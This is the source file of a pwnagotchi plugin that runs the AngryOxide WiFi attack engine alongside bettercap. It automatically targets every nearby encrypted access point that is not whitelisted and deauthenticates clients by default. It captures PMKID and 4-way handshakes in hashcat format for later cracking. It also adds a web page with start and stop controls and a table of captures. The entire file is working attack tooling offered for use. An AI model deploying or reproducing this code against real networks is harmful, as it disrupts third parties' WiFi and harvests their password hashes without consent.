import glob
import logging
import os
import shutil
import signal
import subprocess
import threading
import time

import pwnagotchi.plugins as plugins
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
from flask import render_template_string, jsonify

TARGETS_FILE = '/tmp/angryoxide_targets.txt'

STATUS_TEMPLATE = """
{% extends "base.html" %}
{% set active_page = "plugins" %}
{% block title %}AngryOxide | {{ title }}{% endblock %}
{% block styles %}
{{ super() }}
<style>
    .ao-status { padding: 16px; }
    .ao-card {
        background: #f5f5f5; border: 1px solid #ddd; border-radius: 4px;
        padding: 16px; margin-bottom: 16px;
    }
    .ao-card h3 { margin: 0 0 12px 0; }
    .ao-grid { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 16px; }
    .ao-stat {
        background: #fff; border: 1px solid #ddd; border-radius: 4px;
        padding: 12px 20px; text-align: center; min-width: 120px;
    }
    .ao-stat .num { font-size: 28px; font-weight: bold; }
    .ao-stat .label { font-size: 11px; color: #666; }
    .ao-running { color: #4CAF50; font-weight: bold; }
    .ao-stopped { color: #f44336; font-weight: bold; }
    .ao-na { color: #999; }
    table.ao-table { width: 100%; border-collapse: collapse; font-size: 13px; }
    table.ao-table th { background: #333; color: #fff; padding: 8px; text-align: left; }
    table.ao-table td { padding: 6px 8px; border-bottom: 1px solid #ddd; }
    .ao-btn {
        padding: 8px 16px; border: 1px solid #999; background: #eee;
        cursor: pointer; border-radius: 4px; margin-right: 8px;
    }
    .ao-btn:hover { background: #ddd; }
</style>
{% endblock %}
{% block script %}
function aoAction(action) {
    fetch('/plugins/angryoxide/api/' + action, {method: 'POST'})
        .then(function(r) { return r.json(); })
        .then(function() { location.reload(); });
}
function refreshStatus() {
    fetch('/plugins/angryoxide/api/status')
        .then(function(r) { return r.json(); })
        .then(function(d) {
            document.getElementById('ao-state').textContent = d.running ? 'RUNNING' : 'STOPPED';
            document.getElementById('ao-state').className = d.running ? 'ao-running' : 'ao-stopped';
            document.getElementById('ao-mode').textContent = d.mode || '-';
            document.getElementById('ao-iface').textContent = d.interface || '-';
            document.getElementById('ao-targets').textContent = d.target_count || 0;
            document.getElementById('ao-captures').textContent = d.capture_count || 0;
            document.getElementById('ao-last').textContent = d.last_capture || '-';
        });
}
setInterval(refreshStatus, 5000);
{% endblock %}
{% block content %}
<div class="ao-status">
    <h2>AngryOxide - Hybrid WiFi Attack Engine</h2>
    <div class="ao-grid">
        <div class="ao-stat"><div class="num" id="ao-state">{{ 'RUNNING' if running else 'STOPPED' }}</div><div class="label">Status</div></div>
        <div class="ao-stat"><div class="num" id="ao-mode">{{ mode }}</div><div class="label">Mode</div></div>
        <div class="ao-stat"><div class="num" id="ao-iface">{{ interface }}</div><div class="label">Interface</div></div>
        <div class="ao-stat"><div class="num" id="ao-targets">{{ target_count }}</div><div class="label">Targets</div></div>
        <div class="ao-stat"><div class="num" id="ao-captures">{{ capture_count }}</div><div class="label">Captures</div></div>
    </div>
    <div class="ao-card">
        <h3>Controls</h3>
        <button class="ao-btn" onclick="aoAction('start')">Start</button>
        <button class="ao-btn" onclick="aoAction('stop')">Stop</button>
    </div>
    {% if captures %}
    <div class="ao-card">
        <h3>Captured Handshakes</h3>
        <p>Last capture: <span id="ao-last">{{ last_capture }}</span></p>
        <table class="ao-table">
            <thead><tr><th>SSID</th><th>BSSID</th><th>Type</th><th>Time</th></tr></thead>
            <tbody>
            {% for c in captures %}
                <tr><td>{{ c.ssid }}</td><td>{{ c.bssid }}</td><td>{{ c.type }}</td><td>{{ c.time }}</td></tr>
            {% endfor %}
            </tbody>
        </table>
    </div>
    {% endif %}
</div>
{% endblock %}
"""


class AngryOxide(plugins.Plugin):
    __author__ = "CoderFX"
    __version__ = "1.0.0"
    __license__ = "GPL3"
    __description__ = "Run AngryOxide alongside bettercap for hybrid WiFi attacks (PMKID/deauth)."

    def __init__(self):
        self.ready = False
        self._available = False
        self._agent = None
        self._process = None
        self._running = False
        self._mode = 'auto'
        self._attack_iface = None
        self._epoch_count = 0
        self._captures = {}
        self._target_count = 0
        self._last_capture = None
        self._watcher_thread = None
        self._watcher_stop = threading.Event()
        self._lock = threading.Lock()
        self._log_thread = None
        self._processed_files = set()

    def on_loaded(self):
        logging.info("[angryoxide] plugin loaded")

    def on_config_changed(self, config):
        self.config = config
        self.ready = True

    def on_ready(self, agent):
        self._agent = agent
        binary = self.options.get('binary', '/usr/local/bin/angryoxide')

        # check if binary exists
        if not os.path.isfile(binary) and not shutil.which(binary):
            logging.warning("[angryoxide] binary not found at %s — plugin disabled", binary)
            self._available = False
            return

        self._available = True
        logging.info("[angryoxide] binary found at %s", binary)

        # create output directory
        output_dir = self.options.get('output_dir', '/tmp/angryoxide')
        os.makedirs(output_dir, exist_ok=True)

        # resolve mode and interface
        self._resolve_mode()

        # disable bettercap attacks if configured
        if self.options.get('disable_bettercap_attacks', True):
            try:
                agent.run('set wifi.deauth false')
                agent.run('set wifi.assoc false')
                logging.info("[angryoxide] disabled bettercap deauth/assoc attacks")
            except Exception as e:
                logging.warning("[angryoxide] failed to disable bettercap attacks: %s", e)

        # kill orphaned processes
        self._kill_orphans()

        # start output watcher
        self._watcher_stop.clear()
        self._watcher_thread = threading.Thread(target=self._output_watcher, daemon=True)
        self._watcher_thread.start()

    def on_unload(self):
        self._stop_angryoxide()
        self._watcher_stop.set()
        # re-enable bettercap attacks
        if self._agent and self.options.get('disable_bettercap_attacks', True):
            try:
                self._agent.run('set wifi.deauth true')
                self._agent.run('set wifi.assoc true')
            except Exception:
                pass

    def _resolve_mode(self):
        """Detect available monitor interfaces and resolve operating mode."""
        mode = self.options.get('mode', 'auto')
        iface_opt = self.options.get('interface', 'auto')
        bcap_iface = self.config.get('main', {}).get('iface', 'wlan0mon')

        mon_ifaces = self._get_monitor_interfaces()
        other_ifaces = [i for i in mon_ifaces if i != bcap_iface]

        if mode == 'dual' or (mode == 'auto' and other_ifaces):
            self._mode = 'dual'
            if iface_opt != 'auto' and iface_opt in mon_ifaces:
                self._attack_iface = iface_opt
            elif other_ifaces:
                self._attack_iface = other_ifaces[0]
            else:
                logging.warning("[angryoxide] dual mode requested but no second monitor interface, falling back to timeslice")
                self._mode = 'timeslice'
                self._attack_iface = bcap_iface
        else:
            self._mode = 'timeslice'
            self._attack_iface = bcap_iface

        logging.info("[angryoxide] mode=%s, interface=%s", self._mode, self._attack_iface)

    def _get_monitor_interfaces(self):
        """Find all monitor-mode wireless interfaces."""
        ifaces = []
        try:
            for name in os.listdir('/sys/class/net'):
                type_path = '/sys/class/net/%s/type' % name
                if os.path.isfile(type_path):
                    with open(type_path) as f:
                        if f.read().strip() == '803':
                            ifaces.append(name)
        except Exception as e:
            logging.debug("[angryoxide] interface detection error: %s", e)
        return ifaces

    def _kill_orphans(self):
        """Kill any orphaned angryoxide processes."""
        try:
            subprocess.run(['pkill', '-f', 'angryoxide'], capture_output=True, timeout=5)
        except Exception:
            pass

    def _collect_targets(self):
        """Collect target APs from bettercap session, filtered by whitelist and RSSI."""
        targets = []
        try:
            s = self._agent.session()
            aps = s.get('wifi', {}).get('aps', [])
            whitelist = set()
            wl_prefixes = []
            for entry in self.config.get('main', {}).get('whitelist', []):
                e = entry.strip()
                if ':' in e and len(e) < 17:
                    wl_prefixes.append(e.upper())
                else:
                    whitelist.add(e.upper())

            min_rssi = self.options.get('min_rssi', -70)

            for ap in aps:
                mac = ap.get('mac', '').upper()
                ssid = ap.get('hostname', '')
                rssi = ap.get('rssi', -200)
                enc = ap.get('encryption', '')

                # skip whitelisted
                if ssid.upper() in whitelist or mac in whitelist:
                    continue
                if any(mac.startswith(p) for p in wl_prefixes):
                    continue

                # skip weak signals
                if rssi < min_rssi:
                    continue

                # skip open networks (nothing to capture)
                if not enc or enc == 'OPEN':
                    continue

                targets.append(mac)

        except Exception as e:
            logging.debug("[angryoxide] target collection error: %s", e)

        return targets

    def _write_target_file(self, targets):
        """Write target MACs to file for angryoxide --targetlist."""
        with open(TARGETS_FILE, 'w') as f:
            for t in targets:
                f.write(t + '\n')
            # append static targets
            static = self.options.get('target_list', '')
            if static and os.path.isfile(static):
                with open(static) as sf:
                    f.write(sf.read())
        self._target_count = len(targets)

    def _build_command(self, autoexit=False):
        """Build the angryoxide CLI command."""
        binary = self.options.get('binary', '/usr/local/bin/angryoxide')
        rate = self.options.get('rate', 2)
        output_dir = self.options.get('output_dir', '/tmp/angryoxide')

        cmd = [
            binary,
            '-i', self._attack_iface,
            '--headless',
            '--notar',
            '-o', os.path.join(output_dir, 'capture'),
            '-r', str(rate),
            '--targetlist', TARGETS_FILE,
        ]

        if self.options.get('nodeauth', False):
            cmd.append('--nodeauth')

        if autoexit:
            cmd.append('--autoexit')

        channels = self.options.get('channels', '')
        if channels:
            cmd.extend(['-c', str(channels)])

        return cmd

    def _start_angryoxide(self, autoexit=False):
        """Launch angryoxide subprocess."""
        if self._running:
            return

        cmd = self._build_command(autoexit=autoexit)
        logging.info("[angryoxide] starting: %s", ' '.join(cmd))

        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            self._running = True

            # start log reader thread
            self._log_thread = threading.Thread(
                target=self._read_output, daemon=True
            )
            self._log_thread.start()

        except Exception as e:
            logging.error("[angryoxide] failed to start: %s", e)
            self._running = False

    def _stop_angryoxide(self):
        """Stop angryoxide subprocess."""
        if not self._process:
            self._running = False
            return

        try:
            os.killpg(os.getpgid(self._process.pid), signal.SIGTERM)
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(self._process.pid), signal.SIGKILL)
                self._process.wait(timeout=3)
            logging.info("[angryoxide] stopped (exit code %s)", self._process.returncode)
        except Exception as e:
            logging.debug("[angryoxide] stop error: %s", e)
        finally:
            self._process = None
            self._running = False

    def _read_output(self):
        """Read angryoxide stdout/stderr and log key events."""
        try:
            for line in iter(self._process.stdout.readline, b''):
                text = line.decode('utf-8', errors='replace').strip()
                if not text:
                    continue
                # log everything at debug, key events at info
                if any(k in text.lower() for k in ['pmkid', 'handshake', 'captured', 'hash']):
                    logging.info("[angryoxide] %s", text)
                else:
                    logging.debug("[angryoxide] %s", text)
        except Exception:
            pass

    def _is_running(self):
        """Check if angryoxide process is still alive."""
        if self._process and self._process.poll() is None:
            return True
        self._running = False
        return False

    def on_epoch(self, agent, epoch, epoch_data):
        if not self._available or not self.ready:
            return

        self._epoch_count += 1
        interval = self.options.get('epoch_interval', 1)
        if self._epoch_count % interval != 0:
            return

        # collect targets
        if self.options.get('auto_target', True):
            targets = self._collect_targets()
        else:
            targets = []

        # add static targets
        static = self.options.get('target_list', '')
        if static and os.path.isfile(static):
            with open(static) as f:
                for line in f:
                    t = line.strip()
                    if t and t not in targets:
                        targets.append(t)

        if not targets:
            logging.debug("[angryoxide] no targets found this epoch")
            return

        self._write_target_file(targets)

        if self._mode == 'dual':
            self._epoch_dual()
        else:
            self._epoch_timeslice()

    def _epoch_dual(self):
        """Dual mode: run angryoxide continuously on separate interface."""
        if not self._is_running():
            self._start_angryoxide(autoexit=False)
        # in dual mode, angryoxide reads target file and continues

    def _epoch_timeslice(self):
        """Time-slice mode: pause bettercap, burst angryoxide, resume."""
        max_seconds = self.options.get('max_burst_seconds', 60)
        try:
            # pause bettercap recon
            self._agent.run('wifi.recon off')
            logging.info("[angryoxide] paused bettercap recon for attack burst")

            self._start_angryoxide(autoexit=True)

            # wait for completion or timeout
            if self._process:
                try:
                    self._process.wait(timeout=max_seconds)
                except subprocess.TimeoutExpired:
                    logging.info("[angryoxide] burst timeout (%ds), stopping", max_seconds)
                    self._stop_angryoxide()

        except Exception as e:
            logging.error("[angryoxide] timeslice error: %s", e)
        finally:
            # critical: always restore bettercap recon
            try:
                self._agent.run('wifi.recon on')
                logging.info("[angryoxide] resumed bettercap recon")
            except Exception as e:
                logging.error("[angryoxide] CRITICAL: failed to resume bettercap recon: %s", e)
                # retry
                time.sleep(2)
                try:
                    self._agent.run('wifi.recon on')
                except Exception:
                    logging.error("[angryoxide] recon restore retry failed")
            self._running = False

    def _output_watcher(self):
        """Background thread polling for new capture files."""
        output_dir = self.options.get('output_dir', '/tmp/angryoxide')
        while not self._watcher_stop.is_set():
            try:
                self._process_captures(output_dir)
            except Exception as e:
                logging.debug("[angryoxide] watcher error: %s", e)
            self._watcher_stop.wait(10)

    def _process_captures(self, output_dir=None):
        """Scan output directory for new .hc22000 files and import handshakes."""
        if output_dir is None:
            output_dir = self.options.get('output_dir', '/tmp/angryoxide')

        hs_dir = self.config.get('bettercap', {}).get('handshakes', '/home/pi/handshakes')

        for hc_file in glob.glob(os.path.join(output_dir, '*.hc22000')):
            if hc_file in self._processed_files:
                continue

            try:
                with open(hc_file) as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        parsed = self._parse_hc22000_line(line)
                        if not parsed:
                            continue

                        ssid, bssid, sta_mac, htype = parsed
                        bssid_clean = bssid.replace(':', '').lower()
                        dest_name = '%s_%s.pcap' % (ssid, bssid_clean)
                        dest_path = os.path.join(hs_dir, dest_name)

                        # skip if already captured
                        if os.path.isfile(dest_path):
                            continue

                        # find corresponding pcapng
                        pcapng_files = glob.glob(os.path.join(output_dir, '*.pcapng'))
                        if pcapng_files:
                            # copy most recent pcapng as the handshake file
                            newest = max(pcapng_files, key=os.path.getmtime)
                            shutil.copy2(newest, dest_path)
                        else:
                            # create a placeholder — the .hc22000 is the real value
                            with open(dest_path, 'wb') as pf:
                                pf.write(b'')

                        # copy hc22000 alongside
                        hc_dest = dest_path.replace('.pcap', '.hc22000')
                        with open(hc_dest, 'w') as hf:
                            hf.write(line + '\n')

                        # record capture
                        key = bssid.lower()
                        self._captures[key] = {
                            'ssid': ssid, 'bssid': bssid, 'sta_mac': sta_mac,
                            'type': htype, 'time': time.strftime('%Y-%m-%d %H:%M:%S')
                        }
                        self._last_capture = time.strftime('%Y-%m-%d %H:%M:%S')

                        # fire handshake event
                        try:
                            plugins.on('handshake', self._agent, dest_path, bssid, sta_mac)
                            logging.info("[angryoxide] imported handshake: %s (%s) [%s]",
                                        ssid, bssid, htype)
                        except Exception as e:
                            logging.debug("[angryoxide] handshake event error: %s", e)

                self._processed_files.add(hc_file)
            except Exception as e:
                logging.debug("[angryoxide] capture processing error: %s", e)

    def _parse_hc22000_line(self, line):
        """Parse a hashcat 22000 format line.
        Format: WPA*TYPE*PMKID/MIC*MACAP*MACCLIENT*ESSID_HEX*...
        Returns: (ssid, bssid, sta_mac, type_str) or None
        """
        try:
            parts = line.split('*')
            if len(parts) < 6 or parts[0] != 'WPA':
                return None

            htype_code = parts[1]
            htype = 'PMKID' if htype_code == '01' else '4-Way HS'

            mac_ap_raw = parts[3]
            mac_sta_raw = parts[4]
            essid_hex = parts[5]

            # format MACs with colons
            bssid = ':'.join(mac_ap_raw[i:i+2] for i in range(0, 12, 2))
            sta_mac = ':'.join(mac_sta_raw[i:i+2] for i in range(0, 12, 2))

            # decode SSID from hex
            ssid = bytes.fromhex(essid_hex).decode('utf-8', errors='replace')

            return (ssid, bssid, sta_mac, htype)
        except Exception:
            return None

    # --- Display ---

    def on_ui_setup(self, ui):
        try:
            pos = self.options.get('position', (210, 109))
            if isinstance(pos, str):
                pos = tuple(int(x) for x in pos.split(','))
            ui.add_element(
                'angryoxide',
                LabeledValue(
                    color=BLACK,
                    label='AO',
                    value='...',
                    position=pos,
                    label_font=ui._fonts.Bold,
                    text_font=ui._fonts.Medium,
                )
            )
        except Exception as e:
            logging.debug("[angryoxide] ui setup error: %s", e)

    def on_ui_update(self, ui):
        try:
            if not self._available:
                ui.set('angryoxide', 'N/A')
            elif self._running:
                count = len(self._captures)
                ui.set('angryoxide', 'R:%d' % count if count else 'RUN')
            else:
                count = len(self._captures)
                ui.set('angryoxide', str(count) if count else 'OFF')
        except Exception:
            pass

    # --- Web UI ---

    def on_webhook(self, path, request):
        if not self.ready:
            return "Plugin not ready"

        if path == '/' or not path:
            captures_list = sorted(
                self._captures.values(),
                key=lambda c: c.get('time', ''),
                reverse=True
            )
            return render_template_string(
                STATUS_TEMPLATE,
                title='AngryOxide',
                running=self._running,
                mode=self._mode,
                interface=self._attack_iface or '-',
                target_count=self._target_count,
                capture_count=len(self._captures),
                captures=captures_list,
                last_capture=self._last_capture or '-',
            )

        elif path == 'api/status':
            return jsonify({
                'available': self._available,
                'running': self._running,
                'mode': self._mode,
                'interface': self._attack_iface,
                'target_count': self._target_count,
                'capture_count': len(self._captures),
                'last_capture': self._last_capture,
            })

        elif path == 'api/captures':
            return jsonify(list(self._captures.values()))

        elif path == 'api/start':
            if self._available and not self._running:
                targets = self._collect_targets()
                if targets:
                    self._write_target_file(targets)
                    self._start_angryoxide(autoexit=self._mode == 'timeslice')
            return jsonify({'ok': True})

        elif path == 'api/stop':
            self._stop_angryoxide()
            return jsonify({'ok': True})

        else:
            return "Not found", 404
